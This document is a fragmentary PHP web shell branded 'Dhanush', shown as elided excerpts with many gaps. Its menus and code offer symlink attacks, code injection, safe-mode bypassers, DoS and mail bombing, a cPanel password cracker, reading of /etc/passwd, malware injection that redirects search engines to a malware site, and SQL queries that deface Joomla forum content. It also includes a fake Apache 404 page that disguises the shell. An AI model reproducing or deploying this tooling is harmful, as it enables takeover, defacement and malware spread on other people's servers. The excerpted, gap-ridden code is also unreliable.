...
<?php
        ...
        {      
                ...
                echo "<table cellspacing=1 cellpadding=5 border=1 class=tbl style=width:60%;>\n";
        ...
        function listtable()
        {
                ...
                echo "<table cellspacing=1 cellpadding=5 class=tbl border=1 style=width:60%;>\n";
                for( $i = 0; $i < $num; $i++ )
                {
...
?>
<div align="center">
<a href="<?php $_SERVER['PHP_SELF'];?>"><span class=headtitle><font style="letter-spacing:3px;" face="Times New Roman, Times, serif" size="6">[ --Dhanush-- ]</font></span></a>
</div>
<hr color="#1B1B1B">
<table cellpadding="0" style="width:100%;">
        ...
        <tr>
                ...
                <td style="width:20%;">Server IP : <a href="http://whois.domaintools.com/<?php serverip(); ?>"><font class="txt"><?php serverip(); ?></font></a></td>
                <td style="width:15%;">Your IP : <font class="txt"><a href="http://whois.domaintools.com/<?php yourip(); ?>"><font class="txt"><?php yourip(); ?></font></a></td>
        </tr>
        <tr>
...
<table border="3" style="border-color:#333333;" width="100%;" cellpadding="2">
        <tr>
                <td style="border:none;"><a href="<?php echo $self.'?symlinkserver'?>"><font class="mainmenu">[Symlink]</font></a></td>
                <td style="border:none;"><a href="<?php echo $self.'?forum'?>"><font class=mainmenu>[Forum]</font></a></td>
                <td style="border:none;"><a href="<?php echo $self.'?secinfo'?>"><font class=mainmenu>[Sec. Info]</font></a></td>
                <td style="border:none;"><a href="<?php echo $self.'?injector'?>"><font class=mainmenu>[Code Inject]</font></a></td>
                <td style="border:none;"><a href="<?php echo $self.'?bypass';?>"><font class=mainmenu>[Bypassers]</font></a></td>
                <td style="border:none;"><a href="<?php echo $self.'?fuzz'?>"><font class=mainmenu>[Server Fuzzer]</font></a></td>
                <td style="border:none;"><a href="<?php echo $self.'?zone'?>"><font class=mainmenu>[Zone-h]</font></a></td>
                <td style="border:none;"><a href="<?php echo $self.'?dos';?>"><font class=mainmenu>[DoS]</font></a></td>
                <td style="border:none;"><a href="<?php echo $self.'?mailbomb'?>"><font class=mainmenu>[Mail]</font></a></td>
                <td style="border:none;"><a href="<?php echo $self.'?tools'?>"><font class=mainmenu>[Tools]</font></a></td>
                <td style="border:none;"><a href="<?php echo $self.'?phpc';?>"><font class=mainmenu>[PHP]</font></a></td>
                <td style="border:none;"><a href="<?php echo $self.'?exploit'?>"><font class=mainmenu>[Exploit]</font></a></td>
                <td style="border:none;"><a href="<?php echo $self.'?connect'?>"><font class=mainmenu>[Connect]</font></a></td>
                <td style="border:none;"><a href="<?php echo $self.'?database'?>"><font class=mainmenu>[SQL]</font></a></td>
        </tr>
</table>
<div style="float:left;">
        <a href="javascript:history.back(1)"><font style="font-size:14px;"> [Back] </font></a>&nbsp;
        <a href="javascript:history.go(1)"><font style="font-size:14px;"> [Forward] </font></a>&nbsp;
        <a href=""><font style="font-size:14px;"> [Refresh] </font></a>&nbsp;</div>
<table style="margin-left:270px; border-color:#333333;" border="2" width="60%;" cellpadding="2">
        <tr align="center">
                <td style="border:none;"><a href="<?php echo $self.'?404'?>"><font class=mainmenu>[404 Page]</font></a></td>
                <td style="border:none;"><a href="<?php echo $self.'?malattack&dir='. $dir;?>"><font class=mainmenu>[Malware Attack]</a></td>
                <td style="border:none;"><a href="<?php echo $self.'?cpanel'?>"><font class=mainmenu>[Cpanel Cracker]</font></a></td>
                <td style="border:none;"><a href="<?php echo $self.'?about'?>"><font class=mainmenu>[About]</font></a></td>
                <td style="border:none;"><a href="<?php echo $self.'?selfkill'?>" onClick="if(confirm('Are You Sure You Want To Kill This Shell ?')){return true;}else{return false;}"><font class=mainmenu>[SelfKill]</font></a></td>
                <td style="border:none;"><a href="<?php echo $self.'?logout'?>"><font class=mainmenu>[LogOut]</font></a></td>
        </tr>
</table>
<table align="center" class="pwdtbl"><br>
    <tr>
        <form method="GET"  action="<?php echo $self; ?>">
        <td style="width:35%;" align="right"> <font style="font-size:14px;">Present Working Directory</font> : </td><td style="width:20%;"><input name="dir" class="box" style="width:300px;" value="<?php if($dir == null){echo getcwd();} else { echo $dir; } ?>"/></td>
    ...
    ------    ------
     ----      ----
        ...
        else if(isset($_REQUEST['cpanel']))
        {
                ...
                <center>
                <form method=post>
                <table style="width:50%;" class=tbl border=1 cellpadding=4>
                        <tr>
        ...
        else if(isset($_REQUEST['malattack']))
        {
                ...
                <td><a href="<?php echo $self; ?>?malattack&codeinsert"><font size="4">| Insert Own Code |</font></a></td></tr></table></center><br>
                <?php
                ...
                <td><a href="<?php echo $self; ?>?malattack&malware&redirect"><font size="4">| Redirect Search Engine TO Malwared site |</font></a></td></tr></table></center>
                <?php
        ...
        ';
                                ...
                                @fclose($fp3);
                                                echo "<table align=center border=1 style='width:60%;' class=tbl><tr><td align=center><font color=#FFFFFF size=3>S. No.</font></td><td align=center><font color=#FFFFFF size=3>Domains</font></td><td align=center><font color=#FFFFFF size=3>Users</font></td><td align=center><font color=#FFFFFF size=3>Symlink</font></td><td align=center><font color=#FFFFFF size=3>Information</font></td></tr>";
                                $dcount = 1;
                        ...
                        ';
                                                ...
                                                $fw3 = fwrite($fp3,$file3);
                                                @fclose($fp3);
                                                echo "<table align=center border=1 style='width:40%;' class=tbl><tr><td align=center><font size=4>S. No.</font></td><td align=center><font size=4>Users</font></td><td align=center><font size=4>Symlink</font></td></tr>";
                                                $dcount = 1;
        ...
        else if(isset($_GET["exploit"]))
        {
                if(!isset($_GET["rootexploit"]))
                {
                        ...
                        <table class=tbl border="1" cellpadding="5" cellspacing="4" style="width:50%;">
                        <tr>
                ...
                <center><table><tr><td><a href="<?php echo $self; ?>?404&new"><font size="4">| Set Your 404 Page |</font></a></td>
                        ...
                        else if(isset($_REQUEST['new']))
                        {
                                ...
                                else
                                {
                                        ?>
                                        <form method=post>
                                        <center><textarea name=message cols=100 rows=18 class=box><marquee>lol! You just got hacked</marquee></textarea></br>
        ...
        else if (isset($_GET["bypass"]))
        {
                ...
                {
                        ?>
                        <table cellpadding="7" align="center" border="3" style="width:70%;" class="tbl">
                                <tr>
...
// Execute Query
        ...
        else if(isset($_GET['action']) && isset($_GET['dbname']))
        {
                ...
                if($_GET['action'] == "viewSchema")
                {
                        ...
                        echo "<br><br><table align=center class=tbl style='width:80%;' border=1>";
                ...
                if($_GET['action'] == "viewdata")
                {
                        ...
                        echo "<table cellspacing=1 cellpadding=5 border=1 class=tbl align=center>\n";
                        echo "<tr>\n";
                        for( $i = 0; $i < $col; $i++ )
                        {
                ...
                if($_GET['action'] == "editData")
                {
                        ...
                        echo "<table class=tbl cellspacing=1 cellpadding=2 border=1>\n";
                        echo "<tr>\n";
                        echo "<th>Name</th>\n";
                        echo "<th>Type</th>\n";
                        echo "<th>Function</th>\n";
        ...
        { ?>
                <center><table><tr><td><a href="<?php echo $self; ?>?forum&defaceforum"><font size="4">| Forum Defacer |</font></a></td>
                <td><a href="<?php echo $self; ?>?forum&passwordchange"><font size="4">| Forum Password Changer |</font></a></td>
                </tr></table></center><br>
                <?php
                        ...
                        if(isset($_POST['forumdeface']))
                        {
                                ...
                                else if($_POST['forumdeface'] == "Hack Joomla")
                                {
                                        ...
                                        $prefix    =  $_POST['prefix'];
                                                ...
                                                {
                                                        if(isset($_POST["all"]) && $_POST["all"] == "All")
                                                                $query = "UPDATE content SET title='$head', introtext='$index'";
                                                        else
                                                                $query = "UPDATE content SET title='$head', introtext='$index' WHERE ID='$catid'";
                                                }
                                                else
                                                {
                                                        if(isset($_POST["all"]) && $_POST["all"] == "All")
                                                                $query = "UPDATE ".$prefix."content SET title='$head', introtext='$index'";
                                                        else
                                                                $query = "UPDATE ".$prefix."content SET title='$head', introtext='$index' WHERE ID='$catid'";
                                                }
                                                $result =@ mysql_query($query,$con);
                                                if($result)
                                                {
                ...
                <center>
                        ...
                        <form action="<?php echo $self; ?>" method = "POST">
                        <table border = "1" width="50%" height="316" style="text-align: center;" class=tbl align="center">
                                <tr>
        ...
        <?php
                ...
                else if(isset($_GET["passwordchange"]))
                {
                        ...
                        <table border = "1" width="50%" height="246" style="text-align: center;" class=tbl align="center">
                                <tr>
        ...
        else if(isset($_GET['tools']))
        {
                ?>
                <center>
                <table class=tbl cellpadding="5" border="1" style="width:50%;">
                        <tr>
                ...
                <table class=tbl cellpadding="5" border="1" style="width:50%;">
                        ...
                        <tr>
                                ...
                                <td><label><input type=radio name=type value="1" checked> /etc/passwd</label><label><input type=checkbox name=reverse value=1 checked> reverse (login -> nigol)</label><hr color="#1B1B1B">
...
<br><br><center><font size=5>Server security information</font><br><br></center>
        <table style="width:100%;" border="1" class="tbl">
        <tr>
...
?>
    <form method="POST" action="<?php echo $self; ?>" >
        ...
        <table class=tbl align="center" border="1" style="width:40%;">
            <tr>
...
?>
        ...
        <tr><td colspan="7" align="center"><font class="txt">Listing folder <?php echo $dir; ?></font> (<?php echo $dircount.' Dirs And '.count($files).' Files'; ?>)</font></td></tr>
    <tr class=file>
        <th style="width:43%;">Name</th>
        <th style="width:7%;">Size</th>
        <th style="width:6%;">Permissions</th>
        <?php if($os != "Windows"){ echo "<th style=\"width:14%;\">Owner / Group</th>"; } ?>
        <th style="width:13%;">Modification Date</th>
        <th style="width:5%;">Rename</th>
                        ...
                        <?php if($os != 'Windows')
                                  {
                                    echo "<td align=center><font size=2>";
                                        ...
                                        echo $owner . "</font></td>";
                                         ...
                                         ?>
                        <td><font class="txt"><?php echo date('Y-m-d H:i:s', @filemtime(getcwd())); ?></font></td>
        ...
        foreach($dirs as $val)
            ...
            <td class='info'><?php if(is_writable($dir . $directorysperator . $val)) { ?><a href="<?php echo $self; ?>?perms&file=<?php echo $dir . $directorysperator . $val; ?>"><font class="wrtperm"><?php echo getFilePermissions($dir . $directorysperator . $val);?></font></a><?php } else if(is_readable($dir . $directorysperator . $val)) { ?><a href="<?php echo $self; ?>?perms&file=<?php echo $dir . $directorysperator . $val; ?>"><font  class="wrtperm"><?php echo getFilePermissions($dir . $directorysperator . $val);?></font></a><?php } else { ?><a href="<?php echo $self; ?>?perms&file=<?php echo $dir . $directorysperator . $val; ?>"><font class="noperm"><?php echo getFilePermissions($dir . $directorysperator . $val);?></font><?php } ?></td>
                                <?php if($os != 'Windows')
                                        ...
                                        $owner = $name['name']. " / ". $group['name'];
                                        echo $owner . "</font></td>";
                                        }  ?><td><font class="txt"><?php echo date('Y-m-d H:i:s', @filemtime($dir . $directorysperator . $val)); ?></font></td>
            ...
            <?php
             ...
             ?>
                   <tr class="file">
                   <td class='file'><a href='<?php echo $self ?>?open=<?php echo $dir . $directorysperator . $val; ?>'><?php if(("/" .$val == $_SERVER["SCRIPT_NAME"]) || ($val == "index.php") || ($val == "index.html") || ($val == "config.php") || ($val == "wp-config.php")) { echo "<font color=red>". $val . "</font>";  } else { echo $val; } ?></a> <?php if($val == "index.php" || $val == "index.html") { if(strlen($ind) != 0) { echo "<a href='?deface=" . $dir . $directorysperator . $val . "'><font color=red>( Deface IT )</font></a>"; } } ?></td>
...
?>
 <body bgcolor="#FFFFFF">
<h1 style="color:#000000">404 Link Dead Found !!! Search Content Link Broken or Not Found</h1>
<p style="color:#000000">The requested URL was not found on this server.<br> Go Back To Home Page :) GoodBye </p>
<hr>
<address style="color:#000000">Apache Server at localhost Port 80</address>
    <style>
